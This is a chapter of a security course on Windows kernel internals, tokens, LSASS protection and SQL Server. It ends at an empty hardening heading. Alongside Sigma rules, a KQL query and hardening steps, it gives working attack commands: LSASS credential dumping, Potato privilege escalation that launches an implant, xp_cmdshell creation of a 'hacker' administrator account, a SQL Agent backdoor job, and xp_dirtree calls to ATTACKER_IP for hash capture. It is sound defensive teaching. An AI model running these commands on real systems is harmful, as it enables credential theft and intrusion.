# Domain 14, Chapter 14B — Windows Internals, Exchange, and Microsoft 365

> **Scope.** NT kernel (ntoskrnl, HAL, SSDT/KiSystemServiceCall). Process internals (EPROCESS, PEB, tokens). Token privileges and impersonation. Handles and named pipes. Windows authentication (NTLM, Kerberos, CredSSP, LSA). LSASS protection (RunAsPPL, Credential Guard, Remote Credential Guard). Windows Defender/AMSI internals. SQL Server security (xp_cmdshell, linked servers, CLR assemblies, Agent jobs). Exchange (EWS, Autodiscover, transport agents, mailbox rules). Microsoft 365 (Graph API, OAuth consent grant, Device Code abuse, Teams, SharePoint, OneDrive).

---

## 1. Windows kernel and syscall dispatch

### 1.1 Kernel architecture

`ntoskrnl.exe` is the Windows kernel executive, containing the scheduler, memory manager, I/O manager, object manager, security reference monitor, and the system call dispatch. `HAL.dll` (Hardware Abstraction Layer) provides hardware-specific interfaces (interrupt controllers, timers, DMA). On modern Windows, the HAL is merged into ntoskrnl at load time.

The kernel executive exposes its services through the SSDT. Win32k.sys (the kernel-mode portion of the Windows subsystem) has its own SSDT shadow table for GDI/USER syscalls. The Security Reference Monitor (`SeAccessCheck`) mediates all object access; every handle-creation operation passes through it.

### 1.2 System call dispatch

On x86_64, the `syscall` instruction traps to `KiSystemCall64` (analogous to Linux's `entry_SYSCALL_64`). The handler saves registers, switches to the kernel stack, and dispatches via the SSDT (System Service Descriptor Table) — an array of function pointers indexed by the syscall number in `EAX`. `KiSystemServiceRepeat` performs the table lookup: `nt!KiServiceTable[eax]` for ntoskrnl syscalls (numbers < 0x1000) or `win32k!W32pServiceTable[eax - 0x1000]` for Win32k (GDI/USER) syscalls.

Windows syscall numbers are not stable across versions (unlike Linux). Each Windows build has different numbers for the same `Nt*`/`Zw*` functions. This is why direct syscall techniques (Domain 11, Chapter 11B §1.3) must resolve numbers dynamically from `ntdll.dll`.

### 1.3 PatchGuard (Kernel Patch Protection — KPP)

PatchGuard is a kernel integrity mechanism that periodically verifies the integrity of critical kernel structures: the SSDT, the IDT (Interrupt Descriptor Table), the GDT (Global Descriptor Table), certain kernel code pages, the MSR (Model Specific Register) values for `LSTAR` (syscall entry point), and critical `EPROCESS`/`ETHREAD` fields. If a modification is detected, KPP triggers a `CRITICAL_STRUCTURE_CORRUPTION` bug check (BSOD — `0x109`).

**KPP bypass history.** KPP's verification routine runs as a deferred procedure call (DPC) scheduled at pseudo-random intervals. Bypass strategies have included:

- **DPC timer manipulation**: locating the KPP DPC timer in the kernel timer list and disabling it. KPP obfuscates the timer (stores it encrypted, moves it between runs), leading to a cat-and-mouse escalation across Windows versions.
- **Exception-handler hijacking**: KPP's verification code uses structured exception handlers. An attacker can modify the exception handler chain to intercept KPP's detection and suppress the bug check.
- **Hypervisor-based bypass**: installing a thin hypervisor below the OS (similar to the Blue Pill concept, Domain 11A §3.6) and using EPT (Extended Page Tables) to present different memory views to KPP's verification routine versus normal kernel execution. KPP reads clean pages; execution sees patched pages.
- **GhostHook (2017)**: abused Intel Processor Trace (PT) to execute code in kernel context by setting up a PT trace buffer that overlaps with executable code. The PT buffer handler runs at high IRQL, bypassing KPP's periodic checks.
- **InfinityHook (2019)**: hooked `NtTraceControl` (the ETW syscall) by modifying the WMI GetCpuClock callback pointer in the `ETW_REG_ENTRY` structure. Since this pointer is not protected by KPP, the attacker gains kernel code execution on every ETW event without triggering KPP.

**Detection.** KPP bypasses are kernel-level — detection requires out-of-band integrity verification: hypervisor-based memory introspection (if the defender's hypervisor runs below the attacker's bypass), hardware-based attestation (TPM measured boot verifying the kernel image), or comparison of in-memory kernel structures against known-good baselines using a trusted kernel debugger.

### 1.4 Driver signing enforcement and HVCI

**Driver Signature Enforcement (DSE).** Since Windows Vista x64, kernel-mode drivers must be signed with a cross-signed certificate (or, since Windows 10 1607, WHQL-signed via the Windows Hardware Dev Center). An unsigned driver cannot be loaded via `NtLoadDriver` or `sc create`.

**Bypassing DSE.** Techniques include: loading a legitimately-signed but vulnerable driver (BYOVD — Bring Your Own Vulnerable Driver), then exploiting the driver's vulnerability to gain arbitrary kernel read/write; exploiting known-vulnerable signed drivers such as `RTCore64.sys` (MSI Afterburner), `dbutil_2_3.sys` (Dell), `ene.sys`, `gdrv.sys` (Gigabyte), `AsIO.sys` (ASUS), and `hw.sys` (Intel). The attacker loads the vulnerable driver, exploits it to write to kernel memory, and disables DSE (by patching the `ci.dll!g_CiOptions` variable) or loads an unsigned malicious driver directly.

```
# Example BYOVD flow (conceptual — authorized testing only)
# 1. Load vulnerable signed driver
sc create VulnDrv binPath= C:\temp\RTCore64.sys type= kernel
sc start VulnDrv

# 2. Exploit driver to gain kernel read/write (tool-specific)
# 3. Patch g_CiOptions to disable signature enforcement
# 4. Load unsigned rootkit driver
# 5. Restore g_CiOptions, unload vulnerable driver (cleanup)
```

**HVCI (Hypervisor-protected Code Integrity).** HVCI uses VBS (Virtualization-Based Security) to enforce code integrity in kernel mode. The hypervisor prevents kernel-mode code from executing unless it is signed and unmodified. HVCI blocks: loading unsigned drivers, modifying kernel code pages (SSDT patching, inline hooking), and executing code from non-executable pages. With HVCI, even a kernel write primitive cannot easily inject executable code — the hypervisor's second-level page tables (EPT) enforce NX on kernel pages that should be non-executable.

**HVCI bypass considerations.** Data-only attacks (modifying kernel data structures without injecting code) are not prevented by HVCI. DKOM (unlinking EPROCESS, modifying tokens) works under HVCI because it only writes to data pages. Callback-pointer overwrites can redirect existing kernel code paths to already-mapped, legitimately-signed code (a form of kernel ROP). The Microsoft Vulnerable Driver Blocklist (`DriverSiPolicy.p7b`, enforced by HVCI) blocks known-exploitable signed drivers.

**Hardening.**
```
# Enable HVCI via Group Policy
GPO: Computer Configuration → Administrative Templates → System → Device Guard →
  "Turn On Virtualization Based Security" → Enabled
  Hypervisor Enforced Code Integrity: "Enabled with UEFI Lock"

# Verify HVCI status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object VirtualizationBasedSecurityStatus, SecurityServicesRunning
# SecurityServicesRunning should include "2" (HVCI)

# Update Vulnerable Driver Blocklist
# Automatically updated via Windows Update; manual update:
# Download latest DriverSiPolicy.p7b from Microsoft
```

**Detection.** Monitor for BYOVD: alert on loading of drivers on the vulnerable driver blocklist. Event ID 3033 / 3063 in CodeIntegrity logs indicates a driver load was blocked or would have been blocked. Sysmon Event ID 6 (driver load) with driver hashes compared against known-vulnerable driver lists.

Sigma rule:
```yaml
title: Known Vulnerable Driver Loaded (BYOVD)
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 6
  filter_hashes:
    Hashes|contains:
      - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862571'  # RTCore64.sys example
      - 'dbutil_2_3'  # placeholder — use actual hash lists
  condition: selection and filter_hashes
level: critical
```

---

## 2. Process internals and tokens

### 2.1 EPROCESS and PEB

Every Windows process has an `EPROCESS` structure in kernel memory (analogous to Linux's `task_struct`). Key fields: `UniqueProcessId` (PID), `ActiveProcessLinks` (doubly-linked list of all processes — the target of DKOM hiding, Domain 11 Chapter 11A §3.3), `Token` (pointer to the process's access token), `Peb` (pointer to the user-mode PEB), `ImageFileName`, `InheritedFromUniqueProcessId` (parent PID), `SectionObject` (the mapped executable image), and `ObjectTable` (the handle table).

The PEB (Process Environment Block, user-mode, accessible via `gs:[0x60]` on x64) contains: `BeingDebugged` flag (anti-debug, Domain 12 Chapter 12A §6.2), `Ldr` (loaded module list — used for PEB traversal in shellcode, Domain 11 Chapter 11A §2.2), `ProcessParameters` (command line, environment, current directory), `NtGlobalFlag`, and `ProcessHeap`. Attackers use `NtQueryInformationProcess(ProcessBasicInformation)` to read the PEB address remotely.

### 2.2 Tokens and privileges

Every process and thread has an access token (`_TOKEN` structure) containing: the user SID, group SIDs (including logon SID, mandatory integrity SID), privilege list (each privilege has an `Enabled` and `EnableByDefault` flag), integrity level (Untrusted, Low, Medium, High, System), the token type (primary vs impersonation), and the impersonation level (Anonymous, Identification, Impersonation, Delegation).

**Enumeration of token privileges:**
```
# From the process itself
whoami /priv

# PowerShell — enumerate all processes and their privilege tokens
Get-Process | ForEach-Object {
  $p = $_; try {
    $h = [System.Diagnostics.Process]::GetProcessById($p.Id)
    Write-Output "$($p.Name) [$($p.Id)]: $($h.StartInfo)"
  } catch {}
}

# Seatbelt — comprehensive token enumeration
Seatbelt.exe TokenPrivileges

# Windows API — programmatic
# OpenProcessToken → GetTokenInformation(TokenPrivileges)
```

#### 2.2.1 SeDebugPrivilege exploitation

`SeDebugPrivilege` bypasses the DACL check on `NtOpenProcess`, granting `PROCESS_ALL_ACCESS` to any process including LSASS. This is the gateway to credential theft.

**Which accounts have it by default:** Administrators group. It can be removed via Group Policy: `Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment → Debug programs`.

**Attack chain — LSASS dump via SeDebugPrivilege:**
```
# Mimikatz (most common, in-memory)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# comsvcs.dll MiniDump (LOLBin — no external tools)
# Find LSASS PID first:
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# ProcDump (Sysinternals — signed by Microsoft, often allowed by EDR)
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

# Task Manager — right-click lsass.exe → Create dump file

# Offline parsing of dump
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
# Or: pypykatz lsa minidump lsass.dmp
```

**Detection:**

| Source | Signal | Details |
|--------|--------|---------|
| Sysmon | Event ID 10 (ProcessAccess) | `TargetImage: lsass.exe` with `GrantedAccess` including `0x1010` or `0x1FFFFF` (PROCESS_ALL_ACCESS) |
| Sysmon | Event ID 1 (Process Create) | `rundll32.exe` with `comsvcs.dll, MiniDump` in command line |
| Security log | Event ID 4688 | `procdump.exe` or `rundll32.exe` with suspicious arguments |
| Defender | Alert | "Suspicious access to LSASS" / "Credential dumping activity" |

Sigma rule:
```yaml
title: LSASS Memory Access for Credential Dumping
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1FFFFF'
      - '0x01410'
      - '0x1010'
      - '0x143a'
  filter_legitimate:
    SourceImage|endswith:
      - '\MsMpEng.exe'
      - '\csrss.exe'
      - '\svchost.exe'
  condition: selection and not filter_legitimate
level: critical
```

#### 2.2.2 SeBackupPrivilege exploitation

Bypasses all file-system ACLs for read access. The attacker can read SAM, SYSTEM, SECURITY hives (for local account hashes), or `ntds.dit` on DCs.

```
# Method 1: reg save (requires SeBackupPrivilege)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Offline extraction
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Method 2: diskshadow/robocopy (for ntds.dit on DCs)
# Use backup API flags to bypass ACLs
robocopy /b \\DC01\C$\Windows\NTDS C:\temp\ ntds.dit

# Method 3: PowerShell with backup semantics
# Open file with FILE_FLAG_BACKUP_SEMANTICS via P/Invoke
```

**Detection:** Event ID 4674 (privileged service called) with `SeBackupPrivilege`. Event ID 4663 (file access) on SAM/SYSTEM/SECURITY/ntds.dit with the backup flag. Monitor `reg save` commands targeting HKLM\SAM or HKLM\SYSTEM.

#### 2.2.3 SeImpersonatePrivilege — Potato family attacks

All Potato attacks share the same pattern: a service account (IIS AppPool, MSSQL, etc.) with `SeImpersonatePrivilege` tricks a SYSTEM-level process into authenticating to an attacker-controlled endpoint, captures the SYSTEM token, and impersonates it.

**JuicyPotatoNG.** Exploits COM/DCOM activation. The attacker creates a local COM server, triggers COM activation that runs as SYSTEM, intercepts the SYSTEM token via the named pipe or COM callback. Works on Windows 10/11 and Server 2019/2022.
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\temp\proof.txt"
```

**PrintSpoofer.** Exploits the Print Spooler service (`SeImpersonatePrivilege` needed). Creates a named pipe `\\.\pipe\YOURPIPE`, abuses `SpoolssSvc` to connect to it with SYSTEM credentials, impersonates the connection.
```
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\temp\implant.exe"
```

**GodPotato.** Exploits the DCOM activation path via `IStorage` trigger. Works across Windows versions without needing specific CLSID enumeration. Triggers SYSTEM authentication to a controlled named pipe.
```
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\implant.exe"
```

**EfsPotato.** Exploits EFS RPC (`MS-EFSR`) to trigger SYSTEM authentication. Combines the EFS coercion (PetitPotam-style, but local) with token impersonation.
```
EfsPotato.exe "cmd /c whoami"
```

**SweetPotato.** Combines multiple techniques: `WinRM` listener, `SpoolSample`, and COM activation in a single tool. Attempts multiple escalation paths and uses whichever succeeds.
```
SweetPotato.exe -p C:\temp\implant.exe
```

**Detection (all Potato variants).**

| Source | Signal | Details |
|--------|--------|---------|
| Sysmon | Event ID 17/18 (Pipe Created/Connected) | Named pipe creation by service accounts (IIS, MSSQL) followed by SYSTEM pipe connection |
| Sysmon | Event ID 1 | Known Potato tool names or hashes as process creation |
| Security log | Event ID 4688 | Child process of service account running as SYSTEM (parent is w3wp.exe/sqlservr.exe, child runs as `NT AUTHORITY\SYSTEM`) |
| Security log | Event ID 4624 (Type 9 — NewCredentials) | Service account impersonating SYSTEM |

Sigma rule:
```yaml
title: Potato Privilege Escalation — Service Account to SYSTEM
logsource:
  product: windows
  service: sysmon
detection:
  selection_pipe:
    EventID: 17
    PipeName|contains:
      - '\pipe\spoolss'
      - '\pipe\efsrpc'
      - '\pipe\lsarpc'
  selection_suspicious_parent:
    EventID: 1
    ParentImage|endswith:
      - '\w3wp.exe'
      - '\sqlservr.exe'
      - '\wsmprovhost.exe'
    User|contains: 'SYSTEM'
  condition: selection_pipe or selection_suspicious_parent
level: high
```

**Hardening.**
1. Remove `SeImpersonatePrivilege` from service accounts where not strictly required:
```
GPO: Computer Configuration → Windows Settings → Security Settings →
  Local Policies → User Rights Assignment →
  "Impersonate a client after authentication" → remove unnecessary accounts
```
2. Use Group Managed Service Accounts (gMSAs) with minimal privileges.
3. Run web apps in AppContainers (which lack `SeImpersonatePrivilege` by default).
4. Disable Print Spooler on servers that don't need it: `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`.

### 2.3 Token impersonation — detailed walkthrough

`ImpersonateLoggedOnUser(hToken)`: the calling thread adopts the specified token for all subsequent access checks. `DuplicateTokenEx`: creates a copy of a token (converting between primary and impersonation types). `SetThreadToken`: assigns an impersonation token to a thread. `RevertToSelf`: drops the impersonation token.

**Token stealing walkthrough (attacker has SeDebugPrivilege):**
```
# Mimikatz — steal token from a SYSTEM process
mimikatz # privilege::debug
mimikatz # token::elevate                   # elevate to SYSTEM
mimikatz # token::elevate /domainadmin      # find and impersonate a DA token

# Incognito (Meterpreter)
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Cobalt Strike
beacon> steal_token <PID>      # steal token from target process
beacon> make_token DOMAIN\user password  # create token with creds
beacon> rev2self               # revert to original token
```

**Token manipulation via Windows API (C pseudocode):**
```c
// 1. Open target process (requires SeDebugPrivilege for protected processes)
hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
// 2. Open the process token
OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
// 3. Duplicate as impersonation token
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                 TokenImpersonation, &hDupToken);
// 4. Impersonate
ImpersonateLoggedOnUser(hDupToken);
// Now all access checks use the stolen token
// 5. Create process with the stolen primary token
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                 TokenPrimary, &hPrimaryToken);
CreateProcessWithTokenW(hPrimaryToken, 0, L"cmd.exe", ...);
```

**Detection.** Event ID 4624 (Logon Type 9 — NewCredentials) when a thread impersonates a different token. Event ID 4648 (explicit credentials used). Sysmon Event ID 10 (ProcessAccess) to high-value processes. Monitor for `OpenProcess` calls targeting `winlogon.exe`, `lsass.exe`, `services.exe`, or any SYSTEM process from unexpected source processes.

### 2.4 Named pipes and impersonation

`CreateNamedPipe` creates a named pipe server. When a client connects and the server calls `ImpersonateNamedPipeClient`, the server thread impersonates the client's token. If the client is SYSTEM (e.g., the Print Spooler, a COM activation, or a service triggered by the attacker), the server thread runs as SYSTEM.

This is the mechanism behind most `SeImpersonatePrivilege` escalation attacks: the attacker runs a named-pipe server, triggers a SYSTEM service to connect, impersonates the connection, and spawns a SYSTEM process.

**Enumeration of active named pipes:**
```
# PowerShell
[System.IO.Directory]::GetFiles("\\.\pipe\")

# SysinternalsSuite
pipelist.exe

# From Linux (if SMB exposed — rare)
nxc smb target -u user -p pass --pipes
```

---

## 3. LSASS protection and credential extraction

### 3.1 Credential storage

LSASS (`lsass.exe`) stores in-memory credentials: NTLM hashes, Kerberos TGTs, Kerberos session keys, WDigest plaintext passwords (if enabled — disabled by default since Windows 8.1), DPAPI master keys, and cached domain credentials (MSCACHEv2/DCC2 hashes for offline logon). Compromising LSASS memory yields all credentials for currently-logged-on users plus cached logons.

**WDigest re-enabling.** Setting `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1` causes LSASS to store plaintext passwords. An attacker with admin access sets this registry key, waits for users to re-authenticate, then dumps plaintext credentials. Detection: monitor changes to this registry value.

### 3.2 LSASS dumping methods — comprehensive

#### Method 1: Mimikatz (in-memory)
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords      # all credentials
mimikatz # sekurlsa::wdigest             # WDigest (plaintext if enabled)
mimikatz # sekurlsa::kerberos            # Kerberos tickets
mimikatz # sekurlsa::msv                 # NTLM hashes only
mimikatz # sekurlsa::dpapi               # DPAPI master keys
```

#### Method 2: comsvcs.dll MiniDump (LOLBin — no external tools)
```
# Must run from an elevated prompt
tasklist /fi "imagename eq lsass.exe"  # Get PID
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full

# Variant: use comsvcs.dll ordinal to avoid string detection
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 <PID> C:\temp\lsass.dmp full
```

#### Method 3: ProcDump (signed by Microsoft)
```
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
# Some EDRs allow ProcDump because it's a Microsoft-signed binary
```

#### Method 4: nanodump (stealthy)
Nanodump creates a minidump of LSASS using only direct syscalls, avoids API hooking detection, and can write the dump to a file using a custom format that bypasses signature-based file-scanning.
```
nanodump.exe --write C:\temp\nano.dmp
nanodump.exe --fork --write C:\temp\nano.dmp  # Fork LSASS first (avoids touching original)
```

#### Method 5: HandleKatz / HandleDuplicator
Opens a duplicate handle to LSASS via an intermediate process. Avoids direct `OpenProcess` on LSASS — instead finds an existing handle to LSASS held by another process and duplicates it.
```
HandleKatz.exe --pid <lsass_pid>
```

#### Method 6: PPLdump / PPLmedic (bypass RunAsPPL)
When LSASS runs as PPL, standard tools cannot open a handle. PPLdump exploits a vulnerability in the PPL model: it injects a legitimate Microsoft-signed DLL (which is allowed to load into PPL processes) with a sideloaded payload that dumps LSASS from within the PPL boundary.

PPLmedic uses a similar approach: it exploits the Windows Error Reporting (WER) service (which runs as PPL) to create a handle to LSASS and leak it to the attacker.
```
PPLdump.exe lsass.exe C:\temp\lsass.dmp
PPLmedic.exe dump lsass C:\temp\lsass.dmp
```

#### Method 7: Kernel driver dump (bypass all user-mode protections)
A kernel driver can read any process's memory regardless of PPL, DACL, or Credential Guard (though Credential Guard isolates some credentials in VTL1). Vulnerable signed drivers (BYOVD) provide this capability.

#### Method 8: MiniDumpWriteDump via custom code
Direct Windows API call — the attacker compiles a minimal C program that calls `MiniDumpWriteDump` on the LSASS process handle, producing a dump file compatible with Mimikatz.

**Offline credential extraction from dump files:**
```
# Mimikatz offline
mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords

# pypykatz (Python, cross-platform)
pypykatz lsa minidump lsass.dmp

# Output includes: NTLM hashes, Kerberos tickets, WDigest (if enabled),
# DPAPI master keys, SSP credentials, LiveSSP credentials
```

### 3.3 Protections

**RunAsPPL (Protected Process Light)**: configures LSASS to run as a PPL process.
```
# Enable
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
# Requires reboot. UEFI lock variant (cannot be disabled by admin without clearing UEFI variable):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 2 /f
```

PPL processes reject `PROCESS_VM_READ` and `PROCESS_ALL_ACCESS` handles from non-PPL processes. `SeDebugPrivilege` does not bypass PPL. Only DLLs signed with the Windows PP (Protected Process) signer can be loaded into PPL processes. Dumping LSASS memory requires a kernel driver, a PPL-signed tool, or an exploit in the PPL boundary itself.

**Bypass:** Loading a vulnerable signed driver (BYOVD) that can read kernel memory — the driver runs in kernel mode, above the PPL boundary. Microsoft's Vulnerable Driver Blocklist (HVCI) mitigates this.

**Credential Guard**: uses VBS to isolate credential material in VTL1. NTLM hashes and Kerberos keys are handled by `LsaIso.exe` in VTL1. Even kernel compromise in VTL0 cannot read VTL1 memory. Credential Guard prevents: NTLM hash theft (the hash never enters VTL0 memory), Kerberos TGT theft, and DPAPI master key theft.

**What Credential Guard does NOT protect:** NTLMv2 responses (the hash is used in VTL1, but the response is computed and sent — the response itself can still be relayed). Cached domain credentials (DCC2/MSCACHEv2) are stored in VTL0. Credentials for local accounts are not protected (only domain credentials). Service account credentials stored by applications (SQL Server, IIS) are in VTL0.

```
# Enable Credential Guard
GPO: Computer Configuration → Administrative Templates → System → Device Guard →
  "Turn On Virtualization Based Security" → Enabled
  Credential Guard Configuration: "Enabled with UEFI Lock"

# Verify
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesRunning
# Should include "1" (Credential Guard) and "2" (HVCI)
```

**Remote Credential Guard**: prevents credentials from being sent to remote servers during RDP sessions. The RDP client authenticates to the remote server using Kerberos (via the local KDC) without sending the user's TGT or NTLM hash. The remote server receives only a service ticket, not the user's reusable credentials.

```
# Enable for RDP client
mstsc /remoteGuard
# Or: GPO: Computer Configuration → Administrative Templates → System →
#   Credentials Delegation → "Restrict delegation of credentials to remote servers"
#   → Enabled, "Require Remote Credential Guard"
```

### 3.4 Detection — LSASS access

| Source | Signal | Details |
|--------|--------|---------|
| Sysmon | Event ID 10 (ProcessAccess) | `TargetImage: *\lsass.exe`, `GrantedAccess` includes `0x1010`, `0x1FFFFF`, `0x143a` |
| Sysmon | Event ID 7 (Image Loaded) | Unexpected DLL loaded into `lsass.exe` |
| Sysmon | Event ID 1 (Process Create) | `rundll32.exe` with `comsvcs.dll` / `procdump.exe -ma lsass` |
| Security log | Event ID 4688 | Process creation with suspicious command lines targeting LSASS |
| Security log | Event ID 4656/4663 | Object access to LSASS process |
| Defender ASR | Rule `9e6c4e1f-...` | "Block credential stealing from LSASS" |

KQL (Sentinel):
```kql
SysmonEvent
| where EventID == 10
| where TargetImage endswith "\\lsass.exe"
| where GrantedAccess in ("0x1FFFFF", "0x1010", "0x143a", "0x01410")
| where SourceImage !endswith "\\MsMpEng.exe"
    and SourceImage !endswith "\\csrss.exe"
    and SourceImage !endswith "\\svchost.exe"
    and SourceImage !endswith "\\WerFault.exe"
| project TimeGenerated, Computer, SourceImage, GrantedAccess, SourceProcessGUID
```

**Hardening checklist:**
1. Enable RunAsPPL with UEFI lock.
2. Enable Credential Guard with UEFI lock.
3. Enable ASR rule "Block credential stealing from LSASS".
4. Disable WDigest: `reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f`.
5. Reduce cached logon count: `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount /t REG_SZ /d 1 /f`.
6. Enable HVCI (blocks BYOVD PPL bypass).
7. Apply Vulnerable Driver Blocklist.

---

## 4. SQL Server security

### 4.1 Discovery and enumeration

**Network discovery:**
```
# Impacket — enumerate SQL Server instances via browser service (UDP 1434)
impacket-mssqlclient -windows-auth domain.local/user:pass@target

# PowerUpSQL — comprehensive SQL Server enumeration
Import-Module PowerUpSQL
Get-SQLInstanceDomain            # Find SQL instances via SPN enumeration
Get-SQLInstanceBroadcast         # UDP broadcast discovery
Get-SQLInstanceScanUDP -ComputerName 10.0.0.0/24
Get-SQLServerLoginDefaultPw      # Check for default passwords

# Netexec
nxc mssql 10.0.0.0/24 -u user -p pass

# SPN enumeration for SQL instances
setspn -T domain.local -Q MSSQLSvc/*
```

**Privilege enumeration:**
```
# PowerUpSQL — check access level
Get-SQLServerInfo -Instance "target\instance" -Username sa -Password pass
Invoke-SQLAudit -Instance "target" -Username user -Password pass

# Check current role
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT * FROM fn_my_permissions(NULL, 'SERVER')
```

### 4.2 Command execution — expanded

**`xp_cmdshell`**: disabled by default, enable and exploit:
```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add';

-- Re-disable to reduce footprint
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

**`sp_OACreate` (COM objects):**
```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\temp\proof.txt';
EXEC sp_OADestroy @shell;
```

**CLR assemblies (arbitrary .NET code):**
```sql
-- Enable CLR
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY ON;

-- Create assembly from hex bytes (compiled C# DLL)
CREATE ASSEMBLY CmdExec FROM 0x4D5A90... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[CmdExec] @cmd NVARCHAR(4000)
  AS EXTERNAL NAME [CmdExec].[StoredProcedures].[CmdExec];

-- Execute
EXEC CmdExec 'whoami';
```

**SQL Agent jobs (persistence):**
```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = N'Backdoor';
EXEC sp_add_jobstep @job_name = N'Backdoor', @step_name = N'Run',
  @subsystem = N'CmdExec', @command = N'powershell -enc <base64>';
EXEC dbo.sp_add_jobserver @job_name = N'Backdoor';
EXEC dbo.sp_start_job N'Backdoor';
```

**Impacket `mssqlclient.py`:**
```
# Interactive SQL shell
impacket-mssqlclient domain.local/user:pass@target -windows-auth

# Enable and use xp_cmdshell directly
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell powershell -enc <base64_payload>
```

### 4.3 Lateral movement — expanded

**Linked server enumeration and exploitation:**
```sql
-- Enumerate linked servers
SELECT * FROM sys.servers WHERE is_linked = 1;
EXEC sp_linkedservers;

-- Execute on linked server
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@servername');

-- Check sysadmin on linked server
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Enable xp_cmdshell on linked server (if sysadmin)
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('xp_cmdshell ''whoami'';') AT [LINKED_SERVER];

-- Chain through multiple links (A → B → C)
SELECT * FROM OPENQUERY([SERVER_B],
  'SELECT * FROM OPENQUERY([SERVER_C], ''SELECT @@servername'')');
```

**PowerUpSQL automated link crawling:**
```powershell
Get-SQLServerLinkCrawl -Instance "initial_server" -Username sa -Password pass
# Automatically discovers and follows linked-server chains
# Reports which links have sysadmin access and xp_cmdshell capability
```

**UNC path credential capture:**
```sql
-- Force SQL Server to authenticate to attacker SMB server
EXEC xp_dirtree '\\ATTACKER_IP\share', 1, 1;
EXEC xp_fileexist '\\ATTACKER_IP\share\file';
EXEC xp_subdirs '\\ATTACKER_IP\share';

-- Capture on attacker side
# Responder
responder -I eth0 -v

# Impacket smbserver
impacket-smbserver share /tmp -smb2support
```

**Privilege escalation within SQL Server:**
```powershell
# PowerUpSQL — automated privesc
Invoke-SQLEscalatePriv -Instance "target" -Username user -Password pass

# Techniques include:
# - db_owner to sysadmin via trustworthy database
# - Impersonation (EXECUTE AS)
# - Linked server abuse
```

### 4.4 Detection

| Source | Signal | Details |
|--------|--------|---------|
| SQL Server audit log | `sp_configure` changes | `xp_cmdshell`, `clr enabled`, `Ole Automation Procedures` enabled |
| SQL Server audit log | `xp_cmdshell` execution | Any execution of `xp_cmdshell` |
| Security log | Event ID 4688 | `cmd.exe` / `powershell.exe` spawned by `sqlservr.exe` |
| Sysmon | Event ID 1 | Child process of `sqlservr.exe` — `cmd.exe`, `powershell.exe` |
| Network | SMB from SQL Server | SQL Server initiating SMB connections to non-file-server hosts |

Sigma rule:
```yaml
title: SQL Server Spawns Command Shell
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    ParentImage|endswith: '\sqlservr.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
  condition: selection
level: critical
```

**Hardening.**
